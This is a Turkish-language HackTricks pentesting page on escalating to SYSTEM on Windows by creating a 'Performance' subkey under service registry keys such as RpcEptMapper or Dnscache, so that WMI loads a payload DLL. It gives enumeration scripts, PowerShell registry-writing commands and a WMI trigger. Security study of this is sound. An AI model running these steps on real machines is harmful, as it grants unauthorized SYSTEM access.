# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Orijinal gönderi:** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Özet

Bir service registry key üzerinde yalnızca **`Create Subkey`** / **`AppendData/AddSubdirectory`** izinlerine sahipseniz, bu yine de iyi bir privesc fırsatıdır. Genellikle **`ImagePath`**, **`ServiceDll`** veya mevcut diğer değerlerin üzerine doğrudan yazamazsınız; ancak yine de aşağıdaki konumların altında bir **`Performance`** alt anahtarı oluşturabilirsiniz:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Token'ınızın **`KEY_CREATE_SUB_KEY`** yetkisine sahip olduğu diğer tüm **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** anahtarları

Buradaki püf noktası, Windows'un eski **PerfLib V1** registration modelini hâlâ desteklemesidir. Bir service'in **`Performance`** alt anahtarı varsa Windows, bir performance counter consumer veri istediğinde buradaki bir DLL'yi yükleyebilir.

Microsoft documentation'a göre minimum registration şöyledir:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Dolayısıyla offensive çıkarım şudur: **yalnızca `SetValue` yerine `CreateSubKey` elde ettiğiniz için bir service registry bulgusunu göz ardı etmeyin**.<sup>[[3]](#references)</sup>

## Bunun code execution için yeterli olmasının nedeni

`Performance` subkey'i bu servislerde genellikle varsayılan olarak mevcut değildir; bu nedenle ihtiyacınız olan primitive **`KEY_CREATE_SUB_KEY`**'dir. Key oluşturulduğunda ve `Library`/`Open`/`Collect`/`Close` içerdiğinde, herhangi bir **performance counter consumer** DLL yüklemesini tetikleyebilir.<sup>[[3]](#references)</sup>

Birkaç önemli ayrıntı:

- **`Library`** value'su bir **full DLL path** gösterebilir.
- DLL, **`OpenPerfData`**, **`CollectPerfData`** ve **`ClosePerfData`** export'larını sunmalı ve `ERROR_SUCCESS` döndürmelidir.
- Code, **vulnerable service process**'inde değil, **consumer'ın context**'inde çalışır.
- Klasik `RpcEptMapper` / `Dnscache` örneğinde bir **WMI performance query**, **`wmiprvse.exe`**'nin DLL'yi **`NT AUTHORITY\SYSTEM`** olarak yüklemesini sağlayabilir.

Primitive'in triage sırasında gözden kaçmasının nedeni budur: parent service key "fully writable" değildir, ancak yine de weaponize edilebilir.

## Quick enumeration

**AccessChk** ile manual spot-check:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Hizmet anahtarlarında **`CreateSubKey`** yetkisine sahip düşük ayrıcalıklı principal'ları aramak için PowerShell örneği:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Faydalı araçlar:

- **PrivescCheck**: `Get-ModifiableRegistryPath`, bu tür sorunları tespit etmek için özel olarak oluşturulmuştur.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: Eski ve savunmasız hedeflerde DLL bırakma, `Performance` kaydı oluşturma, WMI trigger'ı, token duplication ve temizleme işlemlerini otomatikleştirir (örneğin: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## İstismar akışı

`Performance` subkey'ini oluşturun ve gerekli değerleri ekleyin:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Ardından **privileged** bir performans consumer'ını tetikleyin. Klasik bir örnek, `Win32_Perf*` sınıfları üzerinden yapılan bir WMI sorgusudur:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operasyonel notlar:

- **`perfmon.exe`** başlatmak, counter registration işleminin doğru olduğunu doğrulamak için kullanışlıdır; ancak bu genellikle DLL'i yalnızca **kendi kullanıcı context'inizde** yükler.
- Gerçek bir LPE için **WMI** gibi **privileged** bir consumer'ı tetikleyin.
- Kendi exploit'inizi yazıyorsanız, DLL içinden doğrudan `cmd.exe` başlatmak genellikle sizi **session 0** içinde bir shell ile bırakır. `Perfusion`, privileged token'ı saldırganın session'ında suspended olarak oluşturulmuş bir process'e duplicate ederek bunu çözer.<sup>[[4]](#references)</sup>
- DLL architecture'ını hedef consumer ile eşleştirin (**x64 sistemlerde x64**).

## Version notes / recent developments

Tarihsel olarak built-in weak key'ler şunlardı:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` ve `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion`, **Nisan 2021** güncellemelerinin güncellenmiş **Windows 8 / Windows Server 2012** sistemlerde kolay exploitation path'ini kaldırdığını, **Windows 7 / Windows Server 2008 R2** sistemlerin ise **`Dnscache`** üzerinden exploitable olmaya devam ettiğini belirtiyor.<sup>[[4]](#references)</sup>

Bu primitive **yalnızca tarihsel** değildir. **Ocak 2025'te** Microsoft, **`Network Configuration Operators`** üyelerinin **`Dnscache`** ve **`NetBT`** altında subkey'ler oluşturabildiği ilişkili bir AD DS issue'sunu patch'ledi ve aynı **Performance-counter DLL registration** fikri, desteklenen sistemlerde **SYSTEM**'e ulaşmak için yeniden kullanılabildi.<sup>[[2]](#references)</sup>

Dolayısıyla modern ders geneldir: düşük yetkili bir principal'ın **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** üzerinde **`CreateSubKey`** yetkisi olduğu her durumda, bulguyu göz ardı etmeden önce bir **`Performance`** child key'inin yeterli olup olmadığını kontrol edin.

## References

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
